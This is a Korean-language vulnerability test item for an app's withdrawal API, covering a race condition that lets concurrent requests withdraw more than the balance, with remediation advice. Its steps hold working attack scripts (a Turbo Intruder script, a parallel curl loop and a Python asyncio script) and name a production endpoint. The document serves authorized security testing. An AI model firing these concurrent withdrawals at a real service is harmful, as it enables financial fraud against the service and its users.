================================================================================
[VCE-ASSETS-03] 입출금 Race Condition → 잔고 부정 조작
도메인: assets (입출금/잔고)
================================================================================

## 1. 진단 항목 개요

- **항목명**: 동시 출금 요청 Race Condition (TOCTOU)
- **번호**: ASSETS-03
- **위험도**: High
- **OWASP**: Business Logic / Concurrency

## 2. 대상 기능 & 엔드포인트

| 항목 | 내용 |
|------|------|
| 로컬 | http://localhost:8080/api/assets/withdraw |
| 운영 | https://vceapp.com/api/assets/withdraw |
| HTTP 메서드 | POST |
| 인증 요건 | Bearer JWT 필요 |

## 3. 취약점 원리 (Why this works)

잔고 차감 로직이 "조회 → 검증 → 차감" 순서로 처리되고,
이 과정이 원자적(atomic)으로 처리되지 않으면 Race Condition이 발생한다.

```
T1: 잔고 조회 → 10,000원 확인
T2: 잔고 조회 → 10,000원 확인 (T1이 아직 차감 전)
T1: 9,000원 출금 → 잔고 1,000원으로 차감
T2: 9,000원 출금 → 잔고 1,000원으로 차감 (이미 T1이 차감했음에도)
결과: 잔고 10,000원으로 9,000원 × 2 = 18,000원 출금 성공
```

데이터베이스 트랜잭션이 없거나, 낙관적 락/비관적 락이 없는 경우 발생한다.

## 4. 테스트 절차 (Step-by-step)

### [사전 준비]
1. test@vce.com 로그인 → JWT 획득
2. 잔고 확인: GET /api/assets/KRW → 잔고 10,000원 이상 확보

---

### Step 1. Burp Suite Turbo Intruder 활용

1. Burp → Proxy → HTTP history에서 출금 요청 우클릭 → Send to Turbo Intruder
2. 스크립트 설정:
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=20,
                           requestsPerConnection=1,
                           pipeline=False)
    for i in range(20):
        engine.queue(target.req, None)

def handleResponse(req, interesting):
    if '200' in req.response:
        table.add(req)
```

---

### Step 2. curl 병렬 출금 테스트

잔고: 10,000원 / 출금 요청: 9,000원 × 5개 동시

```bash
JWT="<your_jwt_here>"

for i in $(seq 1 5); do
  curl -s -X POST http://localhost:8080/api/assets/withdraw \
    -H "Authorization: Bearer $JWT" \
    -H "Content-Type: application/json" \
    -d '{"assetType":"KRW","amount":9000}' &
done
wait

# 최종 잔고 확인
curl -s http://localhost:8080/api/assets/KRW \
  -H "Authorization: Bearer $JWT"
```

정상: 첫 번째 요청만 성공, 나머지 4개는 "잔고 부족" 오류
취약: 여러 요청이 동시에 성공하여 잔고가 음수가 되거나, 10,000원보다 많이 출금됨

---

### Step 3. Python 비동기 동시 요청

```python
import asyncio
import aiohttp

JWT = "<your_jwt>"
URL = "http://localhost:8080/api/assets/withdraw"

async def withdraw(session):
    async with session.post(URL,
        headers={"Authorization": f"Bearer {JWT}"},
        json={"assetType": "KRW", "amount": 9000}
    ) as resp:
        return await resp.json()

async def main():
    async with aiohttp.ClientSession() as session:
        tasks = [withdraw(session) for _ in range(10)]
        results = await asyncio.gather(*tasks)
        for r in results:
            print(r)

asyncio.run(main())
```

---

### Step 4. 결과 검증

```
GET /api/assets/KRW HTTP/1.1
Host: localhost:8080
Authorization: Bearer <JWT>
```

- 정상: 잔고 ≥ 0 (초기 잔고 - 성공한 1건의 출금액)
- 취약: 잔고 음수 또는 예상보다 더 많은 금액 출금

## 5. 취약 여부 판단 기준

✅ **취약 (Vulnerable)**:
- 동시 5개 요청 중 2개 이상 성공 (잔고보다 많이 출금)
- 최종 잔고가 음수
- 성공 응답이 예상 성공 횟수보다 많음

✗ **안전 (Not Vulnerable)**:
- 동시 요청 중 1개만 성공, 나머지는 "잔고 부족" 반환
- DB 트랜잭션 + 비관적 락(`SELECT FOR UPDATE`) 적용됨

## 6. 예상 취약 포인트 (코드 위치)

- `AssetService.java` — withdraw 메서드에서 조회 → 검증 → 차감이 비원자적
- `AssetRepository.java` — 잔고 조회/갱신에 락 없음

## 7. 권고 조치

- 비관적 락: `@Lock(LockModeType.PESSIMISTIC_WRITE)` 또는 `SELECT ... FOR UPDATE`
- 낙관적 락: `@Version` 필드 추가, 충돌 시 재시도
- DB 레벨 체크 제약: `CHECK (balance >= 0)`
- Redis를 이용한 분산 락 (고성능 환경)
